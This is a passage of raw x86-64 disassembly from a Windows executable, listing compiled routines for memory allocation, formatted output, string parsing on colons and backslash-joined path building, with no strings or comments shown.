   140001e4a:	33 c0                	xor    %eax,%eax
   140001e4c:	48 8b 8c 24 20 20 00 	mov    0x2020(%rsp),%rcx
   140001e53:	00 
   140001e54:	48 33 cc             	xor    %rsp,%rcx
   140001e57:	e8 44 96 00 00       	call   0x14000b4a0
   140001e5c:	48 81 c4 30 20 00 00 	add    $0x2030,%rsp
   140001e63:	5f                   	pop    %rdi
   140001e64:	5d                   	pop    %rbp
   140001e65:	5b                   	pop    %rbx
   140001e66:	c3                   	ret
   140001e67:	cc                   	int3
   140001e68:	cc                   	int3
   140001e69:	cc                   	int3
   140001e6a:	cc                   	int3
   140001e6b:	cc                   	int3
   140001e6c:	cc                   	int3
   140001e6d:	cc                   	int3
   140001e6e:	cc                   	int3
   140001e6f:	cc                   	int3
   140001e70:	48 85 c9             	test   %rcx,%rcx
   140001e73:	74 1e                	je     0x140001e93
   140001e75:	53                   	push   %rbx
   140001e76:	48 83 ec 20          	sub    $0x20,%rsp
   140001e7a:	48 8b d9             	mov    %rcx,%rbx
   140001e7d:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   140001e81:	e8 82 3a 01 00       	call   0x140015908
   140001e86:	48 8b cb             	mov    %rbx,%rcx
   140001e89:	e8 7a 3a 01 00       	call   0x140015908
   140001e8e:	48 83 c4 20          	add    $0x20,%rsp
   140001e92:	5b                   	pop    %rbx
   140001e93:	c3                   	ret
   140001e94:	cc                   	int3
   140001e95:	cc                   	int3
   140001e96:	cc                   	int3
   140001e97:	cc                   	int3
   140001e98:	cc                   	int3
   140001e99:	cc                   	int3
   140001e9a:	cc                   	int3
   140001e9b:	cc                   	int3
   140001e9c:	cc                   	int3
   140001e9d:	cc                   	int3
   140001e9e:	cc                   	int3
   140001e9f:	cc                   	int3
   140001ea0:	40 53                	rex push %rbx
   140001ea2:	48 83 ec 20          	sub    $0x20,%rsp
   140001ea6:	ba 88 50 00 00       	mov    $0x5088,%edx
   140001eab:	b9 01 00 00 00       	mov    $0x1,%ecx
   140001eb0:	e8 4b 3a 01 00       	call   0x140015900
   140001eb5:	48 8b d8             	mov    %rax,%rbx
   140001eb8:	48 85 c0             	test   %rax,%rax
   140001ebb:	75 16                	jne    0x140001ed3
   140001ebd:	48 8d 15 3c bb 02 00 	lea    0x2bb3c(%rip),%rdx        # 0x14002da00
   140001ec4:	48 8d 0d 61 bb 02 00 	lea    0x2bb61(%rip),%rcx        # 0x14002da2c
   140001ecb:	e8 f0 00 00 00       	call   0x140001fc0
   140001ed0:	48 8b c3             	mov    %rbx,%rax
   140001ed3:	48 83 c4 20          	add    $0x20,%rsp
   140001ed7:	5b                   	pop    %rbx
   140001ed8:	c3                   	ret
   140001ed9:	cc                   	int3
   140001eda:	cc                   	int3
   140001edb:	cc                   	int3
   140001edc:	cc                   	int3
   140001edd:	cc                   	int3
   140001ede:	cc                   	int3
   140001edf:	cc                   	int3
   140001ee0:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   140001ee5:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140001eea:	53                   	push   %rbx
   140001eeb:	55                   	push   %rbp
   140001eec:	56                   	push   %rsi
   140001eed:	57                   	push   %rdi
   140001eee:	48 83 ec 38          	sub    $0x38,%rsp
   140001ef2:	49 8b f0             	mov    %r8,%rsi
   140001ef5:	48 8d 6c 24 78       	lea    0x78(%rsp),%rbp
   140001efa:	48 8b da             	mov    %rdx,%rbx
   140001efd:	48 8b f9             	mov    %rcx,%rdi
   140001f00:	e8 3b f1 ff ff       	call   0x140001040
   140001f05:	48 89 6c 24 28       	mov    %rbp,0x28(%rsp)
   140001f0a:	4c 8b ce             	mov    %rsi,%r9
   140001f0d:	4c 8b c3             	mov    %rbx,%r8
   140001f10:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140001f17:	00 00 
   140001f19:	48 8b d7             	mov    %rdi,%rdx
   140001f1c:	48 8b 08             	mov    (%rax),%rcx
   140001f1f:	48 83 c9 02          	or     $0x2,%rcx
   140001f23:	e8 28 35 01 00       	call   0x140015450
   140001f28:	85 c0                	test   %eax,%eax
   140001f2a:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   140001f2f:	0f 48 c1             	cmovs  %ecx,%eax
   140001f32:	48 83 c4 38          	add    $0x38,%rsp
   140001f36:	5f                   	pop    %rdi
   140001f37:	5e                   	pop    %rsi
   140001f38:	5d                   	pop    %rbp
   140001f39:	5b                   	pop    %rbx
   140001f3a:	c3                   	ret
   140001f3b:	cc                   	int3
   140001f3c:	cc                   	int3
   140001f3d:	cc                   	int3
   140001f3e:	cc                   	int3
   140001f3f:	cc                   	int3
   140001f40:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140001f45:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   140001f4a:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140001f4f:	53                   	push   %rbx
   140001f50:	56                   	push   %rsi
   140001f51:	57                   	push   %rdi
   140001f52:	48 83 ec 30          	sub    $0x30,%rsp
   140001f56:	48 8b fa             	mov    %rdx,%rdi
   140001f59:	48 8d 74 24 60       	lea    0x60(%rsp),%rsi
   140001f5e:	48 8b d9             	mov    %rcx,%rbx
   140001f61:	e8 da f0 ff ff       	call   0x140001040
   140001f66:	45 33 c9             	xor    %r9d,%r9d
   140001f69:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140001f6e:	4c 8b c7             	mov    %rdi,%r8
   140001f71:	48 8b d3             	mov    %rbx,%rdx
   140001f74:	48 8b 08             	mov    (%rax),%rcx
   140001f77:	e8 b0 33 01 00       	call   0x14001532c
   140001f7c:	48 83 c4 30          	add    $0x30,%rsp
   140001f80:	5f                   	pop    %rdi
   140001f81:	5e                   	pop    %rsi
   140001f82:	5b                   	pop    %rbx
   140001f83:	c3                   	ret
   140001f84:	cc                   	int3
   140001f85:	cc                   	int3
   140001f86:	cc                   	int3
   140001f87:	cc                   	int3
   140001f88:	cc                   	int3
   140001f89:	cc                   	int3
   140001f8a:	cc                   	int3
   140001f8b:	cc                   	int3
   140001f8c:	cc                   	int3
   140001f8d:	cc                   	int3
   140001f8e:	cc                   	int3
   140001f8f:	cc                   	int3
   140001f90:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140001f95:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140001f9a:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   140001f9f:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140001fa4:	48 83 ec 28          	sub    $0x28,%rsp
   140001fa8:	48 8d 54 24 38       	lea    0x38(%rsp),%rdx
   140001fad:	e8 fe 00 00 00       	call   0x1400020b0
   140001fb2:	48 83 c4 28          	add    $0x28,%rsp
   140001fb6:	c3                   	ret
   140001fb7:	cc                   	int3
   140001fb8:	cc                   	int3
   140001fb9:	cc                   	int3
   140001fba:	cc                   	int3
   140001fbb:	cc                   	int3
   140001fbc:	cc                   	int3
   140001fbd:	cc                   	int3
   140001fbe:	cc                   	int3
   140001fbf:	cc                   	int3
   140001fc0:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140001fc5:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   140001fca:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140001fcf:	53                   	push   %rbx
   140001fd0:	48 83 ec 20          	sub    $0x20,%rsp
   140001fd4:	48 8b c2             	mov    %rdx,%rax
   140001fd7:	48 8b d9             	mov    %rcx,%rbx
   140001fda:	48 8b c8             	mov    %rax,%rcx
   140001fdd:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   140001fe2:	e8 c9 00 00 00       	call   0x1400020b0
   140001fe7:	48 8b cb             	mov    %rbx,%rcx
   140001fea:	e8 61 3e 01 00       	call   0x140015e50
   140001fef:	48 83 c4 20          	add    $0x20,%rsp
   140001ff3:	5b                   	pop    %rbx
   140001ff4:	c3                   	ret
   140001ff5:	cc                   	int3
   140001ff6:	cc                   	int3
   140001ff7:	cc                   	int3
   140001ff8:	cc                   	int3
   140001ff9:	cc                   	int3
   140001ffa:	cc                   	int3
   140001ffb:	cc                   	int3
   140001ffc:	cc                   	int3
   140001ffd:	cc                   	int3
   140001ffe:	cc                   	int3
   140001fff:	cc                   	int3
   140002000:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140002005:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   14000200a:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   14000200f:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140002014:	53                   	push   %rbx
   140002015:	48 83 ec 20          	sub    $0x20,%rsp
   140002019:	e8 f6 93 01 00       	call   0x14001b414
   14000201e:	b9 02 00 00 00       	mov    $0x2,%ecx
   140002023:	8b d8                	mov    %eax,%ebx
   140002025:	e8 56 3c 01 00       	call   0x140015c80
   14000202a:	48 8b c8             	mov    %rax,%rcx
   14000202d:	48 8d 15 40 ba 02 00 	lea    0x2ba40(%rip),%rdx        # 0x14002da74
   140002034:	44 8b c3             	mov    %ebx,%r8d
   140002037:	e8 04 ff ff ff       	call   0x140001f40
   14000203c:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140002041:	48 8d 54 24 38       	lea    0x38(%rsp),%rdx
   140002046:	e8 65 00 00 00       	call   0x1400020b0
   14000204b:	48 83 c4 20          	add    $0x20,%rsp
   14000204f:	5b                   	pop    %rbx
   140002050:	c3                   	ret
   140002051:	cc                   	int3
   140002052:	cc                   	int3
   140002053:	cc                   	int3
   140002054:	cc                   	int3
   140002055:	cc                   	int3
   140002056:	cc                   	int3
   140002057:	cc                   	int3
   140002058:	cc                   	int3
   140002059:	cc                   	int3
   14000205a:	cc                   	int3
   14000205b:	cc                   	int3
   14000205c:	cc                   	int3
   14000205d:	cc                   	int3
   14000205e:	cc                   	int3
   14000205f:	cc                   	int3
   140002060:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140002065:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   14000206a:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000206f:	53                   	push   %rbx
   140002070:	48 83 ec 20          	sub    $0x20,%rsp
   140002074:	48 8b c2             	mov    %rdx,%rax
   140002077:	48 8b d9             	mov    %rcx,%rbx
   14000207a:	48 8b c8             	mov    %rax,%rcx
   14000207d:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   140002082:	e8 29 00 00 00       	call   0x1400020b0
   140002087:	ff 15 8b b0 02 00    	call   *0x2b08b(%rip)        # 0x14002d118
   14000208d:	8b c8                	mov    %eax,%ecx
   14000208f:	e8 fc 58 00 00       	call   0x140007990
   140002094:	4c 8b c0             	mov    %rax,%r8
   140002097:	48 8d 0d de b9 02 00 	lea    0x2b9de(%rip),%rcx        # 0x14002da7c
   14000209e:	48 8b d3             	mov    %rbx,%rdx
   1400020a1:	e8 ea fe ff ff       	call   0x140001f90
   1400020a6:	48 83 c4 20          	add    $0x20,%rsp
   1400020aa:	5b                   	pop    %rbx
   1400020ab:	c3                   	ret
   1400020ac:	cc                   	int3
   1400020ad:	cc                   	int3
   1400020ae:	cc                   	int3
   1400020af:	cc                   	int3
   1400020b0:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   1400020b5:	57                   	push   %rdi
   1400020b6:	b8 40 10 00 00       	mov    $0x1040,%eax
   1400020bb:	e8 80 93 00 00       	call   0x14000b440
   1400020c0:	48 2b e0             	sub    %rax,%rsp
   1400020c3:	48 8b 05 76 df 03 00 	mov    0x3df76(%rip),%rax        # 0x140040040
   1400020ca:	48 33 c4             	xor    %rsp,%rax
   1400020cd:	48 89 84 24 30 10 00 	mov    %rax,0x1030(%rsp)
   1400020d4:	00 
   1400020d5:	48 8b da             	mov    %rdx,%rbx
   1400020d8:	48 8b f9             	mov    %rcx,%rdi
   1400020db:	e8 60 ef ff ff       	call   0x140001040
   1400020e0:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   1400020e5:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   1400020ea:	4c 8b cf             	mov    %rdi,%r9
   1400020ed:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1400020f4:	00 00 
   1400020f6:	41 b8 00 08 00 00    	mov    $0x800,%r8d
   1400020fc:	48 8b 08             	mov    (%rax),%rcx
   1400020ff:	48 83 c9 02          	or     $0x2,%rcx
   140002103:	e8 48 33 01 00       	call   0x140015450
   140002108:	41 b8 00 08 00 00    	mov    $0x800,%r8d
   14000210e:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140002113:	48 8d 8c 24 30 08 00 	lea    0x830(%rsp),%rcx
   14000211a:	00 
   14000211b:	e8 90 5f 00 00       	call   0x1400080b0
   140002120:	48 8d 8c 24 30 08 00 	lea    0x830(%rsp),%rcx
   140002127:	00 
   140002128:	48 85 c0             	test   %rax,%rax
   14000212b:	48 8d 5c 24 30       	lea    0x30(%rsp),%rbx
   140002130:	48 0f 45 d9          	cmovne %rcx,%rbx
   140002134:	b9 02 00 00 00       	mov    $0x2,%ecx
   140002139:	e8 42 3b 01 00       	call   0x140015c80
   14000213e:	48 8b c8             	mov    %rax,%rcx
   140002141:	48 8d 15 98 b8 02 00 	lea    0x2b898(%rip),%rdx        # 0x14002d9e0
   140002148:	4c 8b c3             	mov    %rbx,%r8
   14000214b:	e8 f0 fd ff ff       	call   0x140001f40
   140002150:	48 8b 8c 24 30 10 00 	mov    0x1030(%rsp),%rcx
   140002157:	00 
   140002158:	48 33 cc             	xor    %rsp,%rcx
   14000215b:	e8 40 93 00 00       	call   0x14000b4a0
   140002160:	48 8b 9c 24 60 10 00 	mov    0x1060(%rsp),%rbx
   140002167:	00 
   140002168:	48 81 c4 40 10 00 00 	add    $0x1040,%rsp
   14000216f:	5f                   	pop    %rdi
   140002170:	c3                   	ret
   140002171:	cc                   	int3
   140002172:	cc                   	int3
   140002173:	cc                   	int3
   140002174:	cc                   	int3
   140002175:	cc                   	int3
   140002176:	cc                   	int3
   140002177:	cc                   	int3
   140002178:	cc                   	int3
   140002179:	cc                   	int3
   14000217a:	cc                   	int3
   14000217b:	cc                   	int3
   14000217c:	cc                   	int3
   14000217d:	cc                   	int3
   14000217e:	cc                   	int3
   14000217f:	cc                   	int3
   140002180:	40 55                	rex push %rbp
   140002182:	53                   	push   %rbx
   140002183:	56                   	push   %rsi
   140002184:	48 8d ac 24 a0 a0 ff 	lea    -0x5f60(%rsp),%rbp
   14000218b:	ff 
   14000218c:	b8 60 60 00 00       	mov    $0x6060,%eax
   140002191:	e8 aa 92 00 00       	call   0x14000b440
   140002196:	48 2b e0             	sub    %rax,%rsp
   140002199:	48 8b 05 a0 de 03 00 	mov    0x3dea0(%rip),%rax        # 0x140040040
   1400021a0:	48 33 c4             	xor    %rsp,%rax
   1400021a3:	48 89 85 50 5f 00 00 	mov    %rax,0x5f50(%rbp)
   1400021aa:	48 8b 19             	mov    (%rcx),%rbx
   1400021ad:	4c 8d 05 2c b8 02 00 	lea    0x2b82c(%rip),%r8        # 0x14002d9e0
   1400021b4:	48 8b f1             	mov    %rcx,%rsi
   1400021b7:	4c 8b ca             	mov    %rdx,%r9
   1400021ba:	ba 00 10 00 00       	mov    $0x1000,%edx
   1400021bf:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1400021c4:	e8 17 fd ff ff       	call   0x140001ee0
   1400021c9:	3d 00 10 00 00       	cmp    $0x1000,%eax
   1400021ce:	0f 8d db 03 00 00    	jge    0x1400025af
   1400021d4:	ba 3a 00 00 00       	mov    $0x3a,%edx
   1400021d9:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1400021de:	e8 cd 9f 00 00       	call   0x14000c1b0
   1400021e3:	48 85 c0             	test   %rax,%rax
   1400021e6:	0f 84 c3 03 00 00    	je     0x1400025af
   1400021ec:	48 8d 48 01          	lea    0x1(%rax),%rcx
   1400021f0:	c6 00 00             	movb   $0x0,(%rax)
   1400021f3:	48 8d 95 50 0f 00 00 	lea    0xf50(%rbp),%rdx
   1400021fa:	48 2b d1             	sub    %rcx,%rdx
   1400021fd:	0f 1f 00             	nopl   (%rax)
   140002200:	0f b6 01             	movzbl (%rcx),%eax
   140002203:	88 04 0a             	mov    %al,(%rdx,%rcx,1)
   140002206:	48 8d 49 01          	lea    0x1(%rcx),%rcx
   14000220a:	84 c0                	test   %al,%al
   14000220c:	75 f2                	jne    0x140002200
   14000220e:	38 44 24 50          	cmp    %al,0x50(%rsp)
   140002212:	0f 84 97 03 00 00    	je     0x1400025af
   140002218:	38 85 50 0f 00 00    	cmp    %al,0xf50(%rbp)
   14000221e:	0f 84 8b 03 00 00    	je     0x1400025af
   140002224:	48 8d 93 70 10 00 00 	lea    0x1070(%rbx),%rdx
   14000222b:	48 8d 8d 50 2f 00 00 	lea    0x2f50(%rbp),%rcx
   140002232:	e8 d9 0d 00 00       	call   0x140003010
   140002237:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   14000223c:	48 8d 8d 50 4f 00 00 	lea    0x4f50(%rbp),%rcx
   140002243:	e8 c8 0d 00 00       	call   0x140003010
   140002248:	48 8d 15 99 b7 02 00 	lea    0x2b799(%rip),%rdx        # 0x14002d9e8
   14000224f:	48 8b cb             	mov    %rbx,%rcx
   140002252:	e8 99 f7 ff ff       	call   0x1400019f0
   140002257:	4c 8d 85 50 2f 00 00 	lea    0x2f50(%rbp),%r8
   14000225e:	41 b9 5c 00 00 00    	mov    $0x5c,%r9d
   140002264:	48 85 c0             	test   %rax,%rax
   140002267:	74 3c                	je     0x1400022a5
   140002269:	48 8d 8d 50 0f 00 00 	lea    0xf50(%rbp),%rcx
   140002270:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   140002275:	48 8d 15 4c b8 02 00 	lea    0x2b84c(%rip),%rdx        # 0x14002dac8
   14000227c:	44 89 4c 24 38       	mov    %r9d,0x38(%rsp)
   140002281:	48 8d 8d 50 3f 00 00 	lea    0x3f50(%rbp),%rcx
   140002288:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   14000228d:	48 8d 85 50 4f 00 00 	lea    0x4f50(%rbp),%rax
   140002294:	44 89 4c 24 28       	mov    %r9d,0x28(%rsp)
   140002299:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000229e:	e8 1d 03 00 00       	call   0x1400025c0
   1400022a3:	eb 33                	jmp    0x1400022d8
   1400022a5:	48 8d 85 50 0f 00 00 	lea    0xf50(%rbp),%rax
   1400022ac:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   1400022b1:	48 8d 15 20 b8 02 00 	lea    0x2b820(%rip),%rdx        # 0x14002dad8
   1400022b8:	48 8d 85 50 4f 00 00 	lea    0x4f50(%rbp),%rax
   1400022bf:	c7 44 24 28 5c 00 00 	movl   $0x5c,0x28(%rsp)
   1400022c6:	00 
   1400022c7:	48 8d 8d 50 3f 00 00 	lea    0x3f50(%rbp),%rcx
   1400022ce:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400022d3:	e8 e8 02 00 00       	call   0x1400025c0
   1400022d8:	48 89 bc 24 90 60 00 	mov    %rdi,0x6090(%rsp)
   1400022df:	00 
   1400022e0:	85 c0                	test   %eax,%eax
   1400022e2:	75 42                	jne    0x140002326
   1400022e4:	48 8d 93 70 30 00 00 	lea    0x3070(%rbx),%rdx
   1400022eb:	4c 8d 85 50 0f 00 00 	lea    0xf50(%rbp),%r8
   1400022f2:	48 8d 8d 50 3f 00 00 	lea    0x3f50(%rbp),%rcx
   1400022f9:	e8 72 46 00 00       	call   0x140006970
   1400022fe:	83 f8 ff             	cmp    $0xffffffff,%eax
   140002301:	0f 85 7a 02 00 00    	jne    0x140002581
   140002307:	4c 8d 85 50 3f 00 00 	lea    0x3f50(%rbp),%r8
   14000230e:	48 8d 95 50 0f 00 00 	lea    0xf50(%rbp),%rdx
   140002315:	48 8d 0d cc b7 02 00 	lea    0x2b7cc(%rip),%rcx        # 0x14002dae8
   14000231c:	e8 df fc ff ff       	call   0x140002000
   140002321:	e9 9f 00 00 00       	jmp    0x1400023c5
   140002326:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   14000232b:	41 b9 5c 00 00 00    	mov    $0x5c,%r9d
   140002331:	4c 8d 85 50 2f 00 00 	lea    0x2f50(%rbp),%r8
   140002338:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000233d:	48 8d 15 cc b7 02 00 	lea    0x2b7cc(%rip),%rdx        # 0x14002db10
   140002344:	48 8d 8d 50 1f 00 00 	lea    0x1f50(%rbp),%rcx
   14000234b:	e8 70 02 00 00       	call   0x1400025c0
   140002350:	85 c0                	test   %eax,%eax
   140002352:	0f 84 94 00 00 00    	je     0x1400023ec
   140002358:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   14000235d:	41 b9 5c 00 00 00    	mov    $0x5c,%r9d
   140002363:	4c 8d 85 50 2f 00 00 	lea    0x2f50(%rbp),%r8
   14000236a:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000236f:	48 8d 15 aa b7 02 00 	lea    0x2b7aa(%rip),%rdx        # 0x14002db20
   140002376:	48 8d 8d 50 1f 00 00 	lea    0x1f50(%rbp),%rcx
   14000237d:	e8 3e 02 00 00       	call   0x1400025c0
   140002382:	85 c0                	test   %eax,%eax
   140002384:	74 66                	je     0x1400023ec
   140002386:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   14000238b:	41 b9 5c 00 00 00    	mov    $0x5c,%r9d
   140002391:	4c 8d 85 50 2f 00 00 	lea    0x2f50(%rbp),%r8
   140002398:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000239d:	48 8d 15 e0 b4 02 00 	lea    0x2b4e0(%rip),%rdx        # 0x14002d884
   1400023a4:	48 8d 8d 50 1f 00 00 	lea    0x1f50(%rbp),%rcx
   1400023ab:	e8 10 02 00 00       	call   0x1400025c0
   1400023b0:	85 c0                	test   %eax,%eax
   1400023b2:	74 38                	je     0x1400023ec
   1400023b4:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   1400023b9:	48 8d 0d 70 b7 02 00 	lea    0x2b770(%rip),%rcx        # 0x14002db30
   1400023c0:	e8 3b fc ff ff       	call   0x140002000
   1400023c5:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   1400023ca:	48 8b bc 24 90 60 00 	mov    0x6090(%rsp),%rdi
   1400023d1:	00 
   1400023d2:	48 8b 8d 50 5f 00 00 	mov    0x5f50(%rbp),%rcx
   1400023d9:	48 33 cc             	xor    %rsp,%rcx
   1400023dc:	e8 bf 90 00 00       	call   0x14000b4a0
   1400023e1:	48 81 c4 60 60 00 00 	add    $0x6060,%rsp
   1400023e8:	5e                   	pop    %rsi
   1400023e9:	5b                   	pop    %rbx
   1400023ea:	5d                   	pop    %rbp
   1400023eb:	c3                   	ret
   1400023ec:	48 8b 5e 08          	mov    0x8(%rsi),%rbx
   1400023f0:	bf 01 00 00 00       	mov    $0x1,%edi
   1400023f5:	48 85 db             	test   %rbx,%rbx
   1400023f8:	74 40                	je     0x14000243a
   1400023fa:	44 8b cf             	mov    %edi,%r9d
   1400023fd:	0f 1f 00             	nopl   (%rax)
   140002400:	48 8d 43 70          	lea    0x70(%rbx),%rax
   140002404:	4c 8d 85 50 1f 00 00 	lea    0x1f50(%rbp),%r8
   14000240b:	4c 2b c0             	sub    %rax,%r8
   14000240e:	66 90                	xchg   %ax,%ax
   140002410:	0f b6 10             	movzbl (%rax),%edx
   140002413:	42 0f b6 0c 00       	movzbl (%rax,%r8,1),%ecx
   140002418:	2b d1                	sub    %ecx,%edx
   14000241a:	75 07                	jne    0x140002423
   14000241c:	48 ff c0             	inc    %rax
   14000241f:	85 c9                	test   %ecx,%ecx
   140002421:	75 ed                	jne    0x140002410
   140002423:	85 d2                	test   %edx,%edx
   140002425:	0f 84 d4 00 00 00    	je     0x1400024ff
   14000242b:	4a 8b 5c ce 08       	mov    0x8(%rsi,%r9,8),%rbx
   140002430:	49 ff c1             	inc    %r9
   140002433:	ff c7                	inc    %edi
   140002435:	48 85 db             	test   %rbx,%rbx
   140002438:	75 c6                	jne    0x140002400
   14000243a:	e8 61 fa ff ff       	call   0x140001ea0
   14000243f:	48 8b d8             	mov    %rax,%rbx
   140002442:	48 85 c0             	test   %rax,%rax
   140002445:	0f 84 51 01 00 00    	je     0x14000259c
   14000244b:	48 8d 48 70          	lea    0x70(%rax),%rcx
   14000244f:	ba 00 10 00 00       	mov    $0x1000,%edx
   140002454:	4c 8d 8d 50 1f 00 00 	lea    0x1f50(%rbp),%r9
   14000245b:	4c 8d 05 7e b5 02 00 	lea    0x2b57e(%rip),%r8        # 0x14002d9e0
   140002462:	e8 79 fa ff ff       	call   0x140001ee0
   140002467:	3d 00 10 00 00       	cmp    $0x1000,%eax
   14000246c:	0f 8d 16 01 00 00    	jge    0x140002588
   140002472:	4c 8b 0e             	mov    (%rsi),%r9
   140002475:	48 8d 8b 70 20 00 00 	lea    0x2070(%rbx),%rcx
   14000247c:	49 81 c1 70 20 00 00 	add    $0x2070,%r9
   140002483:	4c 8d 05 56 b5 02 00 	lea    0x2b556(%rip),%r8        # 0x14002d9e0
   14000248a:	ba 00 10 00 00       	mov    $0x1000,%edx
   14000248f:	e8 4c fa ff ff       	call   0x140001ee0
   140002494:	3d 00 10 00 00       	cmp    $0x1000,%eax
   140002499:	0f 8d e9 00 00 00    	jge    0x140002588
   14000249f:	4c 8b 0e             	mov    (%rsi),%r9
   1400024a2:	48 8d 8b 70 30 00 00 	lea    0x3070(%rbx),%rcx
   1400024a9:	49 81 c1 70 30 00 00 	add    $0x3070,%r9
   1400024b0:	4c 8d 05 29 b5 02 00 	lea    0x2b529(%rip),%r8        # 0x14002d9e0
   1400024b7:	ba 00 10 00 00       	mov    $0x1000,%edx
   1400024bc:	e8 1f fa ff ff       	call   0x140001ee0
   1400024c1:	3d 00 10 00 00       	cmp    $0x1000,%eax
   1400024c6:	0f 8d bc 00 00 00    	jge    0x140002588
   1400024cc:	48 8b 06             	mov    (%rsi),%rax
   1400024cf:	8b 88 74 50 00 00    	mov    0x5074(%rax),%ecx
   1400024d5:	89 8b 74 50 00 00    	mov    %ecx,0x5074(%rbx)
   1400024db:	48 8b cb             	mov    %rbx,%rcx
   1400024de:	e8 ad f5 ff ff       	call   0x140001a90
   1400024e3:	85 c0                	test   %eax,%eax
   1400024e5:	74 30                	je     0x140002517
   1400024e7:	48 8d 95 50 1f 00 00 	lea    0x1f50(%rbp),%rdx
   1400024ee:	48 8d 0d b3 b5 02 00 	lea    0x2b5b3(%rip),%rcx        # 0x14002daa8
   1400024f5:	e8 06 fb ff ff       	call   0x140002000
   1400024fa:	e9 95 00 00 00       	jmp    0x140002594
   1400024ff:	48 85 db             	test   %rbx,%rbx
   140002502:	75 1a                	jne    0x14000251e
   140002504:	48 8d 95 50 1f 00 00 	lea    0x1f50(%rbp),%rdx
   14000250b:	48 8d 0d 4e b6 02 00 	lea    0x2b64e(%rip),%rcx        # 0x14002db60
   140002512:	e9 a9 fe ff ff       	jmp    0x1400023c0
   140002517:	48 63 c7             	movslq %edi,%rax
   14000251a:	48 89 1c c6          	mov    %rbx,(%rsi,%rax,8)
   14000251e:	48 8b 7b 08          	mov    0x8(%rbx),%rdi
   140002522:	48 3b 7b 10          	cmp    0x10(%rbx),%rdi
   140002526:	73 30                	jae    0x140002558
   140002528:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000252f:	00 
   140002530:	48 8d 4f 12          	lea    0x12(%rdi),%rcx
   140002534:	48 8d 95 50 0f 00 00 	lea    0xf50(%rbp),%rdx
   14000253b:	e8 bc 34 01 00       	call   0x1400159fc
   140002540:	48 8b d7             	mov    %rdi,%rdx
   140002543:	48 8b cb             	mov    %rbx,%rcx
   140002546:	85 c0                	test   %eax,%eax
   140002548:	74 2d                	je     0x140002577
   14000254a:	e8 31 f5 ff ff       	call   0x140001a80
   14000254f:	48 8b f8             	mov    %rax,%rdi
   140002552:	48 3b 43 10          	cmp    0x10(%rbx),%rax
   140002556:	72 d8                	jb     0x140002530
   140002558:	4c 8d 85 50 1f 00 00 	lea    0x1f50(%rbp),%r8
   14000255f:	48 8d 95 50 0f 00 00 	lea    0xf50(%rbp),%rdx
   140002566:	48 8d 0d 2b b6 02 00 	lea    0x2b62b(%rip),%rcx        # 0x14002db98
   14000256d:	e8 8e fa ff ff       	call   0x140002000
   140002572:	e9 4e fe ff ff       	jmp    0x1400023c5
   140002577:	e8 84 f1 ff ff       	call   0x140001700
   14000257c:	83 f8 ff             	cmp    $0xffffffff,%eax
   14000257f:	74 d7                	je     0x140002558
   140002581:	33 c0                	xor    %eax,%eax
   140002583:	e9 42 fe ff ff       	jmp    0x1400023ca
   140002588:	48 8d 0d f9 b4 02 00 	lea    0x2b4f9(%rip),%rcx        # 0x14002da88
   14000258f:	e8 6c fa ff ff       	call   0x140002000
   140002594:	48 8b cb             	mov    %rbx,%rcx
   140002597:	e8 d4 f8 ff ff       	call   0x140001e70
   14000259c:	48 8d 95 50 1f 00 00 	lea    0x1f50(%rbp),%rdx
   1400025a3:	48 8d 0d b6 b5 02 00 	lea    0x2b5b6(%rip),%rcx        # 0x14002db60
   1400025aa:	e9 11 fe ff ff       	jmp    0x1400023c0
   1400025af:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   1400025b4:	e9 19 fe ff ff       	jmp    0x1400023d2
   1400025b9:	cc                   	int3
   1400025ba:	cc                   	int3
   1400025bb:	cc                   	int3
   1400025bc:	cc                   	int3
   1400025bd:	cc                   	int3
   1400025be:	cc                   	int3
   1400025bf:	cc                   	int3
